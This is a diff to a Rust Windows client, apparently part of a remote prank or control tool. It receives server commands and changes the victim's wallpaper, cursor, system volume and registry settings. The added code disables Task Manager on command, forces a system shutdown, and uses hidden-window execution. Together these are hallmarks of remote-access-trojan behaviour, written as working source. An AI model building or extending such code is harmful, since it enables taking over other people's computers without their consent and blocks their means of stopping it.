@@ -1,20 +1,28 @@
 pub mod command {
+    use crate::commands::task_manager::task_manager::disable_task_manager;
+    use base64::prelude::BASE64_STANDARD;
+    use base64::Engine;
+    use notify_rust::Notification;
+    use rodio::{Decoder, Sink};
+    use serde::Deserialize;
+    use std::ffi::OsStr;
     use std::io::{Cursor, Write};
     use std::ops::Deref;
-    use windows_sys::Win32::UI::WindowsAndMessaging::{SetSystemCursor, LoadCursorFromFileW, OCR_NORMAL, IDC_ARROW, SystemParametersInfoW, SPI_SETCURSORS, SPIF_SENDCHANGE, SPIF_UPDATEINIFILE};
-    use std::ffi::OsStr;
     use std::os::windows::ffi::OsStrExt;
     use std::os::windows::process::CommandExt;
     use std::ptr::null_mut;
-    use base64::Engine;
-    use base64::prelude::BASE64_STANDARD;
-    use serde::{Deserialize};
-    use notify_rust::Notification;
-    use rodio::{Decoder, Sink};
-    use tempfile::{Builder};
-    use winreg::enums::HKEY_CURRENT_USER;
-    use winreg::RegKey;
+    use system_shutdown::shutdown;
+    use tempfile::Builder;
     use tokio::task::spawn_blocking;
+    use windows_registry::CURRENT_USER;
+    use windows_sys::Win32::UI::WindowsAndMessaging::{LoadCursorFromFileW, SetSystemCursor, SystemParametersInfoW, OCR_NORMAL, SPIF_SENDCHANGE, SPIF_UPDATEINIFILE, SPI_SETCURSORS};
+
+    use windows::core::Result;
+    use windows::Win32::Media::Audio::Endpoints::IAudioEndpointVolume;
+    use windows::Win32::Media::Audio::{
+        eConsole, eRender, IMMDevice, IMMDeviceEnumerator, MMDeviceEnumerator,
+    };
+    use windows::Win32::System::Com::{CoCreateInstance, CoInitialize, CLSCTX_ALL};
 
     pub enum RPTResponse {
         IncompatibleServerVersion,
@@ -28,6 +36,7 @@ pub mod command {
         ChangeEnabledTskManager,
         ChangeWallpaper,
         ChangeCursor,
+        ChangeAudioVolume,
         Shutdown,
         WinMessage
     }
@@ -39,8 +48,33 @@ pub mod command {
         pub flags: Vec<String>,
     }
 
+    fn set_volume(level: f32) -> Result<()> {
+        unsafe {
+            let _ = CoInitialize(None);
+
+            let enumerator: IMMDeviceEnumerator = CoCreateInstance(
+                &MMDeviceEnumerator,
+                None,
+                CLSCTX_ALL
+            )?;
+
+            let device: IMMDevice = enumerator.GetDefaultAudioEndpoint(
+                eRender,
+                eConsole
+            )?;
+
+            let volume_control: IAudioEndpointVolume = device.Activate(
+                CLSCTX_ALL,
+                None
+            )?;
+
+            volume_control.SetMasterVolumeLevelScalar(level, std::ptr::null())?;
+        }
+        Ok(())
+    }
+
     impl RPTCommand {
-        pub async fn execute(&self) -> Result<RPTResponse, ()> {
+        pub async fn execute(&self) -> Result<RPTResponse> {
             const CREATE_NO_WINDOW: u32 = 0x08000000;
 
             match self.rpt_type {
@@ -106,14 +140,9 @@ pub mod command {
                     else if self.flags.contains(&"SET_SIZE".to_string()) {
                         let data = &self.data;
                         let cursor_size = u32::from_be_bytes(data.deref().try_into().unwrap());
-                        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
 
-                        let (key_acc, _d2) = hkcu.create_subkey(r"Software\Microsoft\Accessibility").expect("Failed Acc");
-                        key_acc.set_value("CursorSize", &cursor_size).expect("Failed Acc val");
-
-                        unsafe {
-                            SystemParametersInfoW(0x002F, 0, null_mut(), 0x01 | 0x02);
-                        }
+                        let key = CURRENT_USER.create("Software\\Microsoft\\Accessibility").expect("Failed Acc");
+                        key.set_u32("CursorSize", cursor_size).expect("Failed SetSize");
                     }
                     else {
                         let data = &self.data;
@@ -143,9 +172,17 @@ pub mod command {
                     Ok(RPTResponse::Success)
                 }
                 RPTCommandType::ChangeEnabledTskManager => {
+                    let _ = disable_task_manager();
+                    Ok(RPTResponse::Success)
+                }
+                RPTCommandType::ChangeAudioVolume => {
+                    let data = &self.data;
+                    let volume_lvl = u32::from_be_bytes(data.deref().try_into().unwrap());
+                    set_volume((volume_lvl as f32)/100.0).expect("failed");
                     Ok(RPTResponse::Success)
                 }
                 RPTCommandType::Shutdown => {
+                    let _ = shutdown();
                     Ok(RPTResponse::Success)
                 }
                 RPTCommandType::ChangeWallpaper => {
